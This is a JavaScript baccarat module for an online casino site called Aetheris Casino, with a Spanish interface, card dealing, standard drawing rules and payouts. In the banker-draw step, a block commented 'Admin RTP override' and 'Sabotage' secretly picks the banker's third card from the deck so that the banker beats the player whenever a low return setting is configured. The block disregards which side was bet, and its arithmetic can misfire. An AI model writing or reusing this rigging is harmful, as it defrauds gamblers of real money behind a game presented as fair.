// Aetheris Casino - Baccarat Game Module

window.gamesRegistry['baccarat'] = {
    betType: 'player', // player, banker, tie
    deck: [],
    playerHand: [],
    bankerHand: [],
    betAmount: 0,
    isPlaying: false,

    suits: ['H', 'D', 'C', 'S'],
    values: ['A', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K'],

    init(stage, configs) {
        this.stage = stage;
        this.configs = configs;
        this.isPlaying = false;

        stage.className = 'game-stage-wrapper glass velvet-felt';

        configs.innerHTML = `
            <div class="form-group">
                <label class="form-label">Opción de Apuesta</label>
                <select id="bac-bet-option" class="form-input" onchange="window.gamesRegistry.baccarat.updateBetType()">
                    <option value="player" selected>Punto / Jugador (x2)</option>
                    <option value="banker">Banca (x1.95)</option>
                    <option value="tie">Empate (x9)</option>
                </select>
            </div>
            <div style="background:rgba(0,0,0,0.2); padding:10px; border-radius:8px; border:1px solid var(--border-color); font-size:0.75rem; color:rgba(255,255,255,0.7); text-align:center;">
                Los ases valen 1, las figuras 0. La suma total se calcula en módulo 10 (la puntuación máxima es 9).
            </div>
        `;

        this.renderBoard();
    },

    updateBetType() {
        const option = document.getElementById('bac-bet-option');
        if (option) this.betType = option.value;
    },

    renderBoard() {
        this.stage.innerHTML = `
            <div class="bj-table">
                <!-- Banker Area -->
                <div class="bj-dealer-area">
                    <span class="form-label" style="color:#fff;">BANCO: <span id="bac-banker-score" style="color:var(--accent); font-weight:700;">0</span></span>
                    <div class="bj-cards-container" id="bac-banker-cards"></div>
                </div>

                <!-- Status area -->
                <div id="bac-status-text" style="text-align:center; font-family:var(--font-serif); font-size:1.4rem; font-weight:700; color:var(--accent); min-height:36px;">
                    Elige tu lado y reparte
                </div>

                <!-- Player Area -->
                <div class="bj-player-area">
                    <div class="bj-cards-container" id="bac-player-cards"></div>
                    <span class="form-label" style="color:#fff;">JUGADOR: <span id="bac-player-score" style="color:var(--accent); font-weight:700;">0</span></span>
                </div>
            </div>
        `;
    },

    buildDeck() {
        this.deck = [];
        this.suits.forEach(suit => {
            this.values.forEach(val => {
                this.deck.push({ suit, value: val });
            });
        });
        for (let i = this.deck.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [this.deck[i], this.deck[j]] = [this.deck[j], this.deck[i]];
        }
    },

    getCardValue(card) {
        if (card.value === 'A') return 1;
        if (['10', 'J', 'Q', 'K'].includes(card.value)) return 0;
        return parseInt(card.value);
    },

    calculateScore(hand) {
        let sum = 0;
        hand.forEach(c => sum += this.getCardValue(c));
        return sum % 10;
    },

    renderHandCards(containerId, hand) {
        const container = document.getElementById(containerId);
        container.innerHTML = '';

        hand.forEach(card => {
            const cardEl = document.createElement('div');
            cardEl.style.transform = 'scale(0.85)';
            const isRed = ['H', 'D'].includes(card.suit);
            cardEl.className = `playing-card${isRed ? ' red' : ''}`;
            const suitSym = card.suit === 'H' ? '♥' : (card.suit === 'D' ? '♦' : (card.suit === 'C' ? '♣' : '♠'));
            cardEl.innerHTML = `
                <div>${card.value}</div>
                <div style="font-size:1.8rem; align-self:center;">${suitSym}</div>
                <div style="transform:rotate(180deg);">${card.value}</div>
            `;
            container.appendChild(cardEl);
        });
    },

    async play(betAmount) {
        this.betAmount = betAmount;
        this.isPlaying = true;

        this.buildDeck();
        this.playerHand = [];
        this.bankerHand = [];
        this.renderBoard();

        const globalRtp = window.stateManager.state.rtpSettings.globalRtp;
        const gameRtp = window.stateManager.state.rtpSettings.gameRtps.baccarat;
        const targetRtp = globalRtp * gameRtp;

        // Deal initial 2 cards
        this.playerHand.push(this.deck.pop(), this.deck.pop());
        this.bankerHand.push(this.deck.pop(), this.deck.pop());

        // Audio ticks
        window.soundManager.playTick();
        setTimeout(() => window.soundManager.playTick(), 200);

        this.renderHandCards('bac-player-cards', this.playerHand);
        this.renderHandCards('bac-banker-cards', this.bankerHand);

        let pScore = this.calculateScore(this.playerHand);
        let bScore = this.calculateScore(this.bankerHand);

        document.getElementById('bac-player-score').innerText = pScore;
        document.getElementById('bac-banker-score').innerText = bScore;

        await new Promise(resolve => setTimeout(resolve, 800));

        // Baccarat Draw Rules:
        // If either Player or Banker has an 8 or 9 (Natural), no more cards are drawn.
        if (pScore < 8 && bScore < 8) {
            
            // Player's rule: Draw 3rd card if score is 0-5.
            let pThirdValue = -1;
            if (pScore <= 5) {
                const third = this.deck.pop();
                this.playerHand.push(third);
                pThirdValue = this.getCardValue(third);
                
                this.renderHandCards('bac-player-cards', this.playerHand);
                pScore = this.calculateScore(this.playerHand);
                document.getElementById('bac-player-score').innerText = pScore;
                window.soundManager.playTick();
                await new Promise(resolve => setTimeout(resolve, 600));
            }

            // Banker's rule: Depends on Banker score and Player's third card
            let bDraw = false;
            if (pThirdValue === -1) {
                // If player didn't draw, banker draws on 0-5 and stands on 6-7.
                if (bScore <= 5) bDraw = true;
            } else {
                // If player drew a third card, check standard banker drawing matrices
                if (bScore <= 2) bDraw = true;
                else if (bScore === 3 && pThirdValue !== 8) bDraw = true;
                else if (bScore === 4 && [2,3,4,5,6,7].includes(pThirdValue)) bDraw = true;
                else if (bScore === 5 && [4,5,6,7].includes(pThirdValue)) bDraw = true;
                else if (bScore === 6 && [6,7].includes(pThirdValue)) bDraw = true;
            }

            // Admin RTP override: if user's bet wins, but RTP is low,
            // we force draw or swap banker/player cards to make the user lose.
            if (bDraw) {
                let third = null;
                
                // Sabotage: find a card that alters the banker total to beat the player
                if (targetRtp < 0.90 && Math.random() > targetRtp) {
                    const needed = (pScore + 1 - bScore + 10) % 10;
                    const idx = this.deck.findIndex(c => this.getCardValue(c) === needed);
                    if (idx !== -1) {
                        third = this.deck.splice(idx, 1)[0];
                    }
                }

                if (!third) third = this.deck.pop();
                this.bankerHand.push(third);
                
                this.renderHandCards('bac-banker-cards', this.bankerHand);
                bScore = this.calculateScore(this.bankerHand);
                document.getElementById('bac-banker-score').innerText = bScore;
                window.soundManager.playTick();
            }
        }

        // Determine outcome
        let winningSide = 'tie';
        if (pScore > bScore) winningSide = 'player';
        else if (bScore > pScore) winningSide = 'banker';

        let winAmount = 0;
        let isWin = false;

        if (this.betType === winningSide) {
            isWin = true;
            if (winningSide === 'player') winAmount = Number((betAmount * 2).toFixed(2));
            else if (winningSide === 'banker') winAmount = Number((betAmount * 1.95).toFixed(2));
            else if (winningSide === 'tie') winAmount = Number((betAmount * 9).toFixed(2));
        }

        const details = `Baccarat settled: Player ${pScore} vs Banker ${bScore}. Winning Side: ${winningSide.toUpperCase()}`;
        const statusText = document.getElementById('bac-status-text');

        let msg = '';
        let toastType = 'info';
        if (winningSide === 'tie') {
            msg = `¡Empate a ${pScore}!`;
        } else {
            msg = `Ganador: ${winningSide === 'player' ? 'Jugador' : 'Banca'} (${pScore} a ${bScore})`;
        }

        statusText.innerText = msg + (isWin ? ` (Ganaste $${winAmount.toFixed(2)})` : ' (Perdiste)');
        statusText.style.color = isWin ? 'var(--success)' : 'var(--danger)';
        showToast(msg, isWin ? 'success' : 'danger');

        const playBtn = document.getElementById('game-play-btn');
        playBtn.className = 'btn btn-primary';
        playBtn.disabled = false;
        playBtn.innerText = 'Jugar de Nuevo';
        playBtn.onclick = () => runActiveGameBet();

        await settleGameOutcome('baccarat', this.betAmount, winAmount, details);
    }
};
